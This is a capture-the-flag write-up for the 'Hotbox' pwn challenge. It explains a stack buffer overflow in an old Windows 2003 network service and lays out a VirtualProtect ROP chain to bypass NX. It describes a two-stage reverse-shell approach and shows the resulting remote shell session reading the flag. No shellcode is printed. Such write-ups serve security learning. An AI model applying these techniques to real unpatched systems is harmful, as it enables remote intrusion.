# Hotbox
**Category**: Pwn

420 Points

4 Solves

**Problem description**:
```
open the WINDOWS!!! you know how to reuse a sockfd right?

ncat hotbox.420blaze.in 42069 (expect 1 in 4 requests to fail, but 42070 and 42071 are available now also)

if you can't pwn, plz open your own windows: X13-04874.img - Version 5.2.3790
```
---

This is actually a very easy Windows 2003 pwn, I don't know why there were so few solves. Maybe because it's Windows?

Anyways, using X13-04874.img found online, vmware takes good care of us and sets up a vm very quickly.
Then, we just download a copy of x64dbg and get started working.

We have a few variables on the stack, and there's a pretty blatant buffer overflow in main:

```C
char recvbuf[2048]; // [esp+0h] [ebp-A54h]
struct WSAData WSAData; // [esp+800h] [ebp-254h]
char sendbuf[128]; // [esp+990h] [ebp-C4h]
struct sockaddr addr; // [esp+A10h] [ebp-44h]
struct sockaddr name; // [esp+A20h] [ebp-34h]
int v24; // [esp+A30h] [ebp-24h]
int addrlen; // [esp+A34h] [ebp-20h]
int v26; // [esp+A38h] [ebp-1Ch]
const char *v27; // [esp+A3Ch] [ebp-18h]
DWORD pRead; // [esp+A40h] [ebp-14h]
SOCKET s; // [esp+A44h] [ebp-10h]
SOCKET sock; // [esp+A48h] [ebp-Ch]
u_short port; // [esp+A4Ch] [ebp-8h]
int readlen; // [esp+A50h] [ebp-4h]
int savedregs; // [esp+A54h] [ebp+0h]
// ...
readlen = recv(sock, recvbuf, 2048, 0);
// ...
memcpy((unsigned int)sendbuf, (unsigned int)recvbuf, readlen);
```

So using a test pattern we can find out that our payload will have return address at offset 0xc8.
Now, it seems like we're back in the good old days: back when everything was loaded at 0x401000 i.e. there's no ASLR.
During my testing, my VM even had the same stack buffer addresses as the remote server.
So in our shellcode later, we don't even need to think about grabbing Winapi function addresses since we can just hardcode them.

Unfortunately, there *is* NX. We can get around this very easily by constructing a simple ropchain to VirtualProtect the stack:
```
+0x00 VirtualProtect (stdcall with ebp stack)
+0x04 return address of our shellcode from VirtualProtect
+0x08 0x12c000 (address of stack)
+0x0c 0x4000 (length to protect)
+0x10 0x40 (PAGE_EXECUTE_READWRITE)
+0x14 0x0041901E (lpflOldProtect, this is required to be some writeable address so I just pass it some crap in .data)
```

We can't simply spawn `cmd` like `system("/bin/sh")` because the program closes the socket before returning. So instead we need to make our own connectback.
It's important to note that `sendbuf`, which `recvbuf` is copied into, has a pretty high stack address, around ~0x12fec0, meaning that even if the recv length is 2048, we can't use more than about 0x140 bytes or else we'll segfault from overflowing the stack.
I don't like to think too hard while writing shellcodes, so I split the exploit up into 2 stages:
 - stage1: use buffer overflow and short (<0x140 bytes) shellcode to recv+exec new stage2 shellcode
 - stage2: get shell

In my testing, it seems like bind shell doesn't work on the remote server so we'll opt for a reverse shell instead.
As for the shellcodes, they're pretty easy to assemble. I just took them from exploitdb and repurposed them quickly.
Spawning reverse shell with winsock is pretty easy, you just need to CreateProcess and use the socket as your stdio.

```
python fuck.py

stage1 done
received connectback from ('67.171.55.160', 52682)
stage2 done
Listening on [0.0.0.0] (family 0, port 4444)
Connection from c-67-171-55-160.hsd1.wa.comcast.net 52732 received!
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 20FE-D5C9

 Directory of C:\Documents and Settings\Administrator\Desktop

04/22/2018  05:06 AM    <DIR>          .
04/22/2018  05:06 AM    <DIR>          ..
04/20/2018  12:45 AM            95,744 blazectf-1.exe
04/22/2018  05:06 AM                 8 commandos_saw_ur_msg_esbr_lol
04/22/2018  03:14 AM                 5 esbr_was_here_now_stop_pwning_and_start_blazin
04/21/2018  01:02 PM             4,447 fixer.bat
04/20/2018  12:01 AM                54 flag.txt
04/20/2018  12:45 AM                41 run.bat
04/20/2018  12:45 AM                41 run2.bat
04/20/2018  12:45 AM                41 run3.bat
               8 File(s)        100,381 bytes
               2 Dir(s)  39,840,907,264 bytes free

C:\Documents and Settings\Administrator\Desktop>type flag.txt
type flag.txt
blaze{h0w_long_d1d_pwning_ezmode_w1ndows_t0ke_you_smh}
C:\Documents and Settings\Administrator\Desktop>
```

And that's it!
